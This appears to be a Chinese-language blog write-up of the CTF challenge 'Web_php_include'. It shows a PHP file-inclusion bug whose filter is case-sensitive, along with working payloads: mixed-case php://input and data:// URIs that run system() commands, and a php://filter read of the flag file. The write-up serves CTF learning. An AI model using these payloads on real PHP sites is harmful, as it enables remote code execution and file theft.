---
layout:     post               # 使用的布局（不需要改）
title:      Web_php_include    # 标题 
subtitle:    攻防世界   #副标题
date:       2020-07-06         # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - CTF
  
---

访问:

    <?php
    	show_source(__FILE__);
    	echo $_GET['hello'];
   		$page=$_GET['page'];
   		while (strstr($page, "php://")) {
    		$page=str_replace("php://", "", $page);
    	}
   		 include($page);
    ?>


`strstr(str1,str2)` 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回 str1字符串从 str2第一次出现的位置开始到 str1结尾的字符串；否则，返回NULL。

它区分大小写，所以可以大小写绕过。

![UCp2e1.png](https://s1.ax1x.com/2020/07/06/UCp2e1.png)

	?page=pHp://input 

	<?php system("cat 'fl4gisisish3r3.php'"); ?>


![UCpOTP.png](https://s1.ax1x.com/2020/07/06/UCpOTP.png)

知道文件名也可可用php:filter协议读取flag
`?page=pHp://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php`

也可以使用data://协议

`?page=data://text/plain,<?php system(ls); ?>`

![UCPsSS.png](https://s1.ax1x.com/2020/07/06/UCPsSS.png)

`?page=data://text/plain,<?php system('cat "fl4gisisish3r3.php"'); ?>`

![UCPWoq.png](https://s1.ax1x.com/2020/07/06/UCPWoq.png)

各协议可以看[这里](https://segmentfault.com/a/1190000018991087)
